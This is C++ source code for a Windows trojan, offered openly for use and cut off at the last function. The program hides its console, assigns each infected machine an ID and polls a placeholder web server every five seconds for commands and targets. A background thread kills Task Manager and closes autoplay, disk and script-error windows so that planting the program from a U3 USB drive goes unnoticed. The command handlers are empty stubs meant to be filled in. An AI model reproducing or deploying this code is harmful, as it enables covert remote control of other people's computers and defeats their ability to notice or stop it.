#include <windows.h>
#pragma comment(lib, "Winmm.lib")
#include <urlmon.h> 
#pragma comment(lib, "urlmon.lib")
#include <iostream>
#include <fstream>
#include <WinInet.h>
#pragma comment(lib, "WinInet.lib")
#include <ShlObj.h>
using namespace std;
 
int Option, Assign, Target;
DWORD WINAPI LowProfile(LPVOID);
DWORD WINAPI Option1(LPVOID);
DWORD WINAPI Option2(LPVOID);
DWORD WINAPI Option3(LPVOID);
DWORD WINAPI Option4(LPVOID);
DWORD WINAPI Option5(LPVOID);
// Add more lines of Option6, Option7, etc. to create more commands.
HWND TaskMgr, SysError, WMP, Disk1, Disk2, Disk3, Disk4, Autoplay, VBS;
 
int main() {
// Hide Console Window
FreeConsole();
 
CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&LowProfile, 0, 0, NULL);
 
// Checks if assign.txt exists. If it doesn't (only first run), download assign.txt. This gives the computer an ID number. You can change assign.txt in the PHP file BEFORE you plug in the U3 drive.
FILE *istream;
if ( (istream = fopen ( "C:\\Windows\\trojan\\assign.txt", "r" ) ) == NULL ) {
    URLDownloadToFile(NULL, L"http://www.yourwebsitehere.com/trojan/assign.html", L"c:\\Windows\\trojan\\assign.txt", NULL, NULL);
} else {
}
 
// Store Assign.txt in a variable
ifstream inAssign;
inAssign.clear();
inAssign.open("c:\\Windows\\trojan\\assign.txt");
inAssign >> Assign;
inAssign.close();
inAssign.clear();
 
// Start the main loop that is downloading the textfile each 5 seconds.
while(1) {
 
    // Download Option & Target
    remove("c:\\Windows\\trojan\\option.txt");
    remove("c:\\Windows\\trojan\\target.txt");
    DeleteUrlCacheEntry(L"http://www.yourwebsitehere.com/trojan/");
    DeleteUrlCacheEntry(L"http://www.yourwebsitehere.com/trojan/target.html");
    Sleep(100);
    URLDownloadToFile(NULL, L"http://www.yourwebsitehere.com/trojan/", L"c:\\Windows\\trojan\\option.txt", NULL, NULL);
    URLDownloadToFile(NULL, L"http://www.yourwebsitehere.com/trojan/target.html", L"c:\\Windows\\trojan\\target.txt", NULL, NULL);
 
    // Read Option
    ifstream inFile;
    inFile.clear();
    inFile.open("c:\\Windows\\trojan\\option.txt");
    inFile >> Option;
    inFile.close();
    inFile.clear();
 
    // Read Target
    ifstream inTarget;
    inTarget.clear();
    inTarget.open("c:\\Windows\\trojan\\target.txt");
    inTarget >> Target;
    inTarget.close();
    inTarget.clear();
 
    // If Target is equal to assign (so you can target a single computer) or if Target is zero (target all computers with your trojan)
    if(Target == Assign || Target == 0) {
        if(Option == 1) { CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&Option1, 0, 0, NULL); }
        else if(Option == 2) { CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&Option2, 0, 0, NULL); }
        else if(Option == 3) { CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&Option3, 0, 0, NULL); }
        else if(Option == 4) { CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&Option4, 0, 0, NULL); }
        else if(Option == 5) { CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&Option5, 0, 0, NULL); }
        // Add more of these lines for more commands
    }
    Sleep(5000);
    }
}
 
// Our LowProfile Thread. Hides all errors and things that may popup while inserting your U3 drive.
DWORD WINAPI LowProfile(LPVOID) {
    while(1) {
        // Obvious
        TaskMgr = FindWindow(NULL,L"Windows Task Manager");
        // May popup because of new hardware installation (U3)
        SysError = FindWindow(NULL,L"System Settings Change");
        // Windows Media Player may popup. Rarely happens, but had this once at a school computer.
        WMP = FindWindow(NULL,L"Windows Media Player");
        // The Removable Disk part of the U3 Drive can open automatically.
        Disk1 = FindWindow(NULL,L"(D:) Removable Disk");
        Disk2 = FindWindow(NULL,L"(E:) Removable Disk");
        Disk3 = FindWindow(NULL,L"(F:) Removable Disk");
        Disk4 = FindWindow(NULL,L"(G:) Removable Disk");
        // Autoplay
        Autoplay = FindWindow(NULL,L"Autoplay");
        // Errors caused by our VBScript go.vbs
        VBS = FindWindow(NULL,L"Windows Script Host");
        if( TaskMgr != NULL) {
            SetWindowText( TaskMgr,L"DIE!!!! =O");
            Sleep(500);
            PostMessage( TaskMgr, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( SysError != NULL) {
            PostMessage( SysError, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( WMP != NULL) {
            Sleep(1000);
            PostMessage( WMP, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( Disk1 != NULL) {
            PostMessage( Disk1, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( Disk2 != NULL) {
            PostMessage( Disk2, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( Disk3 != NULL) {
            PostMessage( Disk3, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( Disk4 != NULL) {
            PostMessage( Disk4, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( Autoplay != NULL) {
            PostMessage( Autoplay, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( VBS != NULL) {
            PostMessage( VBS, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        Sleep(500);
    }
}
 
//
// Here we start with our commands. Option1, Option2, Option3, etc.
// Don't forget to also define and create a process for these Options if you want to create more.
// Have Fun =D
//
 
DWORD WINAPI Option1(LPVOID) { // 1
    return 0;
}
 
DWORD WINAPI Option2(LPVOID) { // 2
    return 0;
}
 
DWORD WINAPI Option3(LPVOID) { // 3
    return 0;
}
 
DWORD WINAPI Option4(LPVOID) { // 4
    return 0;
}
 
DWORD WINAPI Option5(LPVOID) { // 5
    return 0;
